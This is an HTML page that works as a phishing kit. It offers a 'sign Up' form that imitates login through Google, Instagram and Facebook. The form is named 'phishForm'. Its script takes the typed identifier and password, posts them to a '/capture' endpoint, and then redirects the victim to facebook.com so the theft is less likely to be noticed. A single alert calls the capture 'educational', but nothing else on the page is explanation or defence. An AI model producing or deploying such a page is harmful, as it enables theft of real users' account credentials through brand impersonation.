<!DOCTYPE html>
<html>
<head>
    <title>SIGNUP</title>
    <style>
        body { font-family: Arial; max-width: 400px; margin: 0 auto; padding: 20px; }
        .login-form { border: 1px solid #ddd; padding: 20px; border-radius: 5px; }
        input, select { width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; }
        button { background-color: #4CAF50; color: white; padding: 12px; border: none; width: 100%; }
        .warning { color: red; font-size: 0.8rem; }
    </style>
</head>
<body>
    <h2>sign Up </h2>
    <div class="login-form">
        <p class="warning">Bienvenue sur Notre page.</p>
        
        <form id="phishForm">
            <label>Login With:</label>
            <select id="loginType" onchange="updatePlaceholder()">
                <option value="email">GOOGLE</option>
                <option value="username">INSTAGRAM</option>
                <option value="phone">FACEBOOK</option>
                <option value="other">Other Identifier</option>
            </select>
            
            <input type="text" id="identifier" placeholder="Email address" required>
            <input type="password" id="password" placeholder="Password" required>
            
            <button type="submit">Login</button>
        </form>
    </div>

    <script>
        function updatePlaceholder() {
            const type = document.getElementById('loginType').value;
            const field = document.getElementById('identifier');
            
            switch(type) {
                case 'email': field.placeholder = 'Email address'; break;
                case 'username': field.placeholder = 'Username'; break;
                case 'phone': field.placeholder = 'Phone number'; break;
                default: field.placeholder = 'Your identifier'; break;
            }
        }

        document.getElementById('phishForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const formData = {
                identifier: document.getElementById('identifier').value,
                password: document.getElementById('password').value
            };
            
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(formData)
            })
            .then(() => {
                alert("[EDUCATIONAL] Simulated login captured");
                window.location.href = 'https://www.facebook.com';
            });
        });
    </script>
</body>
</html>
